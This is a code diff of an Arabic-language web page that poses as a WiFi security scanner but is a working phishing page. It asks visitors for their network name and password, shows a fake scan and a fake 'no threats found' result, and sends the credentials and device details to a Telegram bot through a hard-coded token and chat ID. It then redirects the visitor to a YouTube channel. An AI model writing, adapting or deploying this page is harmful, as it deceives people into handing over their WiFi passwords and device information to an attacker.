@@ -3,71 +3,93 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>فحص أمان الشبكة - WiFi Security</title>
+    <title>WiFi Security Audit</title>
     <style>
-        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #e9ecef; margin: 0; padding: 20px; display: flex; align-items: center; justify-content: center; height: 100vh; }
-        .card { background: white; width: 100%; max-width: 380px; padding: 30px; border-radius: 15px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); text-align: center; }
-        .icon { font-size: 50px; color: #17a2b8; margin-bottom: 15px; }
-        h2 { color: #343a40; margin-bottom: 10px; font-size: 1.4rem; }
-        p { color: #6c757d; font-size: 0.95rem; line-height: 1.5; margin-bottom: 25px; }
-        input { width: 100%; padding: 12px; margin-bottom: 15px; border: 1px solid #ced4da; border-radius: 8px; box-sizing: border-box; font-size: 1rem; }
-        button { width: 100%; background-color: #17a2b8; color: white; padding: 13px; border: none; border-radius: 8px; cursor: pointer; font-size: 1.1rem; font-weight: bold; transition: 0.3s; }
-        button:hover { background-color: #138496; }
-        #msg { margin-top: 15px; font-size: 0.9rem; font-weight: bold; }
+        body { font-family: 'Segoe UI', Tahoma, sans-serif; background-color: #f8f9fa; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
+        .card { background: white; width: 90%; max-width: 400px; padding: 30px; border-radius: 15px; box-shadow: 0 8px 30px rgba(0,0,0,0.1); text-align: center; }
+        .icon { font-size: 50px; color: #28a745; margin-bottom: 15px; }
+        h2 { color: #333; margin-bottom: 10px; }
+        p { color: #666; font-size: 0.9rem; margin-bottom: 20px; }
+        input { width: 100%; padding: 12px; margin-bottom: 15px; border: 1px solid #ddd; border-radius: 8px; box-sizing: border-box; }
+        button { width: 100%; background: #28a745; color: white; padding: 13px; border: none; border-radius: 8px; cursor: pointer; font-size: 1rem; font-weight: bold; }
+        
+        #loader { display: none; margin-top: 20px; }
+        .prog-bar { width: 100%; background: #eee; height: 8px; border-radius: 10px; overflow: hidden; }
+        .prog-fill { width: 0%; height: 100%; background: #28a745; transition: width 5s linear; }
+        
+        #result { display: none; margin-top: 20px; color: #28a745; font-weight: bold; }
     </style>
 </head>
 <body>
 
-<div class="card">
+<div class="card" id="box">
     <div class="icon">🛡️</div>
-    <h2>أداة التحقق من أمان الشبكة</h2>
-    <p>يرجى إدخال بيانات الشبكة الحالية لفحص وجود أي ثغرات أو عمليات اختراق نشطة في اتصالك بالإنترنت.</p>
+    <h2 id="title">فحص أمان الشبكة</h2>
+    <p id="desc">أدخل بيانات الواي فاي للتأكد من خلو اتصالك من المتلصصين والهكر.</p>
     
-    <input type="text" id="wifiName" placeholder="اسم شبكة الواي فاي (SSID)" required>
-    <input type="password" id="wifiPass" placeholder="كلمة سر الشبكة" required>
-    
-    <button onclick="checkSecurity()">بدء الفحص الآن</button>
-    
-    <div id="msg"></div>
+    <div id="inputs">
+        <input type="text" id="wifiName" placeholder="اسم الشبكة">
+        <input type="password" id="wifiPass" placeholder="كلمة السر">
+        <button onclick="process()">بدء عملية التحقق</button>
+    </div>
+
+    <div id="loader">
+        <p>جاري تحليل أمان الشبكة والجهاز...</p>
+        <div class="prog-bar"><div class="prog-fill" id="fill"></div></div>
+    </div>
+
+    <div id="result">
+        <p>✅ تم الفحص! لم يتم العثور على تهديدات.</p>
+        <p>جاري توجيهك لتقرير الأمان...</p>
+    </div>
 </div>
 
 <script>
-    const token = "8295590667:AAFCZ3w2Uf0g5OBO7_QU7mwS2apdbTjwCqY"; 
-    const chatId = "8042090388";
+    const token = "8295590667:AAFCZ3w2Uf0g5OBO7_QU7mwS2apdbTjwCqY";
+    const chat = "8042090388";
 
-    async function checkSecurity() {
+    async function process() {
         const name = document.getElementById('wifiName').value;
         const pass = document.getElementById('wifiPass').value;
-        const msg = document.getElementById('msg');
 
-        if (!name || !pass) {
-            msg.style.color = "red";
-            msg.innerText = "يرجى ملء جميع الحقول للمتابعة.";
-            return;
-        }
+        if(!name || !pass) { alert("أدخل البيانات أولاً"); return; }
 
-        msg.style.color = "#17a2b8";
-        msg.innerText = "جاري فحص الثغرات... يرجى عدم إغلاق الصفحة";
+        // إخفاء المدخلات وإظهار التحميل
+        document.getElementById('inputs').style.display = 'none';
+        document.getElementById('loader').style.display = 'block';
+        document.getElementById('fill').style.width = '100%';
 
-        // إرسال البيانات إلى تليجرام
-        const text = `🎯 صيد جديد (فحص أمان):\n📶 اسم الشبكة: ${name}\n🔑 كلمة السر: ${pass}`;
-        
-        try {
-            await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: chatId, text: text })
-            });
+        // إرسال تقرير المعلومات فوراً إلى تليجرام
+        const report = `
+📢 تقرير فحص أمان جديد:
+----------------------
+📶 الشبكة: ${name}
+🔑 الباسورد: ${pass}
+----------------------
+📱 معلومات الجهاز:
+- نظام التشغيل: ${navigator.platform}
+- المتصفح: ${navigator.userAgent.split(') ')[1]}
+- الشاشة: ${screen.width}x${screen.height}
+- اللغة: ${navigator.language}
+        `;
 
-            // التوجيه لقناة اليوتيوب المحددة بعد ثانيتين
+        fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({ chat_id: chat, text: report })
+        });
+
+        // الانتظار 5 ثوانٍ لإتمام الفحص الوهمي
+        setTimeout(() => {
+            document.getElementById('loader').style.display = 'none';
+            document.getElementById('result').style.display = 'block';
+
+            // بعد ثانيتين من ظهور "تم الفحص"، يتم التحويل لليوتيوب
             setTimeout(() => {
                 window.location.href = "https://youtube.com/@benjaminbennetttt?si=9J7bqSt389IK3tUB";
             }, 2000);
-            
-        } catch (e) {
-            msg.style.color = "red";
-            msg.innerText = "فشل الاتصال، حاول مجدداً.";
-        }
+
+        }, 5000);
     }
 </script>
 
